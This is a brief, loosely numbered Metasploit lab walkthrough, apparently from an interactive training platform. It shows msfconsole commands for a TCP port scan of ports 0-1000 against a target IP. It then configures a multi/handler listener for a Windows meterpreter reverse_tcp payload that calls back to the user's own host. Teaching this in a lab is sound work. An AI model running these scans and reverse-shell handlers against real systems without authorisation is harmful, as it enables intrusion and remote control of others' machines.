### `msfconsole`

### Step 01. Verify that the tool is installed
  1. First switch to root (the tool is sync with your permisiion lvl)
  ```
  # To start the tool 
  msfconsole
  ```

* Now i can still move in through the dir's
```
show auxiliary
```{{exec}}

```
use auxiliary/scanner/portscan/tcp
```{{exec}}

1.	“show auxiliary” - showing all the auxilliaries avaible
2.	“use auxiliary/scanner/portscan/tcp” =output=> msf6 auxiliary(scanner/portscan/tcp):
4)"set PORTS 0-1000" (telling the tool wich ports i want it to scan) 
1.	“set RHOSTS <target ip>”
2.	“run”
3.	"use exploit/multi/handler" (changing my exploit to multi handler)
4.	“set payload windows/meterpreter/reverse_tcp” (changing the payload to meterpreter)
5.	"set LHOST <my ip>
6.	“run” 
